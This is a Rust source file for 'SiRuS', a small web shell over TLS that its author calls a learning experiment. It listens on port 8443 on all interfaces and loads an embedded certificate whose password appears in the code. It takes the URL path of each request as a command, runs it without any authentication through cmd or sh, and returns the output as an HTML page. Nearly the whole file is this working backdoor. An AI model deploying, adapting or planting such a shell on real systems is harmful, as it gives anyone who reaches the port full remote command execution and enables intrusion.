// SiRuS: Simple Rust (web) Shell over TLS
//  a simple experiment learning Rust

use std::{
    io::{prelude::*, BufReader},
    net::{TcpListener, TcpStream}, process::Output,
};

use std::process::Command;
use urlencoding::decode;

use native_tls::{Identity, TlsAcceptor, TlsStream};
use std::sync::Arc;
use std::thread;

// CHANGE HERE THE SERVER PORT
static PORT: &str = "8443";

// CHANGE THE pfx FILE NAME AT LINE 81


fn main() {

    //pass the password for the embedded certificate as arg
    let args: Vec<String> = std::env::args().collect();
    
    //decomment for debug use
    //let args = vec!["SiRuS", "Zinz#72"];

    if args.len() > 1 {
    
        //get the certificate password
        let password = &args[1]; 

        //config listener endpoint
        let addr_port = format!("0.0.0.0:{}", PORT);

        //load the certificate as embedded resource
        match load_cert(password){

            Ok(identity) => {
                
                //bind the listener to all IPV4 interfaces
                let listener = TcpListener::bind(addr_port).expect("Cannot initiate the local TCP connection");
                let acceptor = TlsAcceptor::new(identity).unwrap();
                let acceptor = Arc::new(acceptor);
                
                //wait for connections
                for stream in listener.incoming() {
                    match stream {
                        Ok(stream) => {
                            let acceptor = acceptor.clone();
                            thread::spawn(move || {
                                let stream = acceptor.accept(stream).unwrap();
                                handle_connection(stream); //manage the connection
                            });
                        }
                        Err(e) => { 
                            println!("An error occured reading the TCP stream: {}", e);
                        }
                    }
                }

            },
            Err(e) => {
                println!("An error occured reading the embedded certificate file: {}", e);
            },
        }
        

    }
    else {
      println!("You must provide the password for the PFX. Try {} Zinz#72", &args[0]);  
    };

}

//load file as embedded resources. the pfx file must reside in the same dir of this file (main.rs)
fn load_cert(password: &str)-> Result<Identity, native_tls::Error> {
    //name of the certificate, must be palced in src (same dir of this file)
    let cert_b = include_bytes!("zinz.pfx");
    //parse the certificate as byte array
    let identity = Identity::from_pkcs12(cert_b, password).expect("Cannot load the embedded certificate");
    Ok(identity)

}

// webshell logic
fn handle_connection(mut stream: TlsStream<TcpStream>) {


    let buf_reader = BufReader::new(&mut stream);

    let request_line = buf_reader.lines().next();

    // check if we get some value in the header req
    if request_line.is_some(){
       
        //parse the command from the URL
        let cmd: String = get_cmd_from_req(request_line.unwrap().unwrap());

        // exec the command
        let output = exec_cmd(cmd.to_owned());

        // set the response status
        let status = "HTTP/1.1 200 OK";
        // set the HTML response body       
        let mut body= String::from(r#"
            <!DOCTYPE html>
            <html lang="en;">
            <head>
            <meta charset="utf-8">
            <style>
                body {background-color:black;color:white}
                pre {color:yellow}
            </style>
            <title>Simple Rust Web$hell</title>
            </head>
            <body>
            <pre>
             _           _          _      _                  _        
            / /\        /\ \       /\ \   /\_\               / /\      
           / /  \       \ \ \     /  \ \ / / /         _    / /  \     
          / / /\ \__    /\ \_\   / /\ \ \\ \ \__      /\_\ / / /\ \__  
         / / /\ \___\  / /\/_/  / / /\ \_\\ \___\    / / // / /\ \___\ 
         \ \ \ \/___/ / / /    / / /_/ / / \__  /   / / / \ \ \ \/___/ 
          \ \ \      / / /    / / /__\/ /  / / /   / / /   \ \ \       
      _    \ \ \    / / /    / / /_____/  / / /   / / /_    \ \ \      
     /_/\__/ / /___/ / /__  / / /\ \ \   / / /___/ / //_/\__/ / /      
     \ \/___/ //\__\/_/___\/ / /  \ \ \ / / /____\/ / \ \/___/ /       
      \_____\/ \/_________/\/_/    \_\/ \/_________/   \_____\/    1.0                                                                                   
            </pre>
        <hr>                                                                                                    
  
        "#);
        //put into the response the command output and eventually the error
        body.push_str(&String::from_utf8_lossy(&output.stdout).replace('\n', "</br>"));
        body.push_str(&String::from_utf8_lossy(&output.stderr));
        //close the body
        body.push_str("</body></html>");

        let resp_len = body.len();
        // format the replay
        let replay = format!(
            "{status}\r\nContent-Length: {resp_len}\r\n\r\n{body}"
        );
        //write the response into the TLS stream
        stream.write_all(replay.as_bytes()).unwrap();
    };

}

// parse the command as canonical URL: https://<server IP>:8443/<cmd>
//  e.g. https://127.0.0.1:8443/whoami
fn get_cmd_from_req(first_header:String) -> String {

    //slice the URL to get only the
    let out = first_header.find("HTTP").unwrap();
    let mut start = first_header.find("/").unwrap();
    start = start+1;

    let cmd: String =first_header.get(start..out).unwrap().to_string();
    //eventually decode the URL
    let dec_cmd = decode(&cmd);

    return dec_cmd.expect("Unable to decode the command").to_string();

}
//exec the shell command
fn exec_cmd(cmd:String) -> Output {
    //check if we are on windows OS
    return if cfg!(target_os = "windows") {
        Command::new("cmd")
                .args(["/C", cmd.trim()])
                .output()
                .expect("failed to execute process")
    } else { // *nix system
        Command::new("sh")
                .arg("-c")
                .arg(cmd.trim())
                .output()
                .expect("failed to execute process")
    };
}
